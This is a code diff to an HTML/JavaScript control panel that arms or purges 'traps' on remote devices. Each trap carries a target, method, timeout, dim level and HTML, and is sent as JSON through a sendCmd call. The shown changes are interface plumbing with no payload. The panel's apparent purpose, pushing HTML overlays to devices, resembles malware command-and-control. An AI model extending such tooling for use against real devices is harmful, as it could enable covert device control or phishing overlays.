@@ -436,6 +436,10 @@
                                         <button class="btn" onclick="openTrapEditor()" style="padding:2px 8px; font-size:0.8rem;">+ NEW</button>
                                     </div>
                                     <div id="trap-registry-list" style="display:flex; flex-direction:column; gap:5px; max-height:200px; overflow-y:auto;"></div>
+                                    <div style="margin-top:10px; display:flex; gap:5px;">
+                                        <button class="btn" style="flex:1; background:var(--primary); color:#000;" onclick="sendCmd('UI_TR_SET')">ARM_SELECTED</button>
+                                        <button class="btn danger" style="font-size:0.6rem;" onclick="sendCmd('UI_TR_REMOVE')">PURGE_FROM_DEVICE</button>
+                                    </div>
                                 </div>
 
                                 <!-- Editor View (Hidden by default) -->
@@ -626,7 +630,7 @@
                                         }).join('')}
                                     </div>
                                     <div class="cmd-actions">
-                                        <button class="btn" style="flex:1; background:var(--primary); color:#000;" onclick="sendCmd('${cmd.id}')">BROADCAST</button>
+                                        ${cmd.id === 'UI_TRAP' ? '' : `<button class="btn" style="flex:1; background:var(--primary); color:#000;" onclick="sendCmd('${cmd.id}')">BROADCAST</button>`}
                                         ${cmd.cleanup ? `<button class="btn danger" style="padding:8px 10px; font-size:0.6rem;" onclick="sendCmd('${cmd.cleanup}')">WIPE/RESET</button>` : ''}
                                         <button class="btn" style="padding:8px 15px; border-color:#333;" onclick="toggleCmdDrawer('${cmd.id}')">CLOSE</button>
                                     </div>
@@ -1181,11 +1185,30 @@
                         const path = document.getElementById('install-path').value;
                         const explanation = document.getElementById('install-html').value;
                         content = explanation ? `${path} | ${explanation}` : path; break;
-                    case 'UI_TRAP':
-                        const registry = JSON.parse(localStorage.getItem('cortex_trap_registry') || '[]');
-                        const activeTrap = registry.find(t => t.id === selectedTrapId);
-                        if (!activeTrap) return toast("SELECT OR CREATE A TRAP FIRST", "danger");
-                        content = `${activeTrap.target}|${activeTrap.method}|${activeTrap.timeout}|${activeTrap.dim}|${activeTrap.html}`; 
+                    case 'UI_TR_SET': // Local handler for setting via JSON
+                        const regSet = JSON.parse(localStorage.getItem('cortex_trap_registry') || '[]');
+                        const trapSet = regSet.find(t => t.id === selectedTrapId);
+                        if (!trapSet) return toast("SELECT A TRAP FIRST", "danger");
+                        type = 'UI_TRAP';
+                        content = JSON.stringify({
+                            action: 'SET',
+                            label: trapSet.label,
+                            target: trapSet.target,
+                            method: trapSet.method,
+                            timeout: parseInt(trapSet.timeout),
+                            dim: parseInt(trapSet.dim),
+                            html: trapSet.html
+                        });
+                        break;
+                    case 'UI_TR_REMOVE':
+                        const regRem = JSON.parse(localStorage.getItem('cortex_trap_registry') || '[]');
+                        const trapRem = regRem.find(t => t.id === selectedTrapId);
+                        if (!trapRem) return toast("SELECT A TRAP TO REMOVE", "danger");
+                        type = 'UI_TRAP';
+                        content = JSON.stringify({
+                            action: 'REMOVE',
+                            label: trapRem.label
+                        });
                         break;
                     case 'POWER_SHIELD':
                         const pst = document.getElementById('ps-toggle').value;
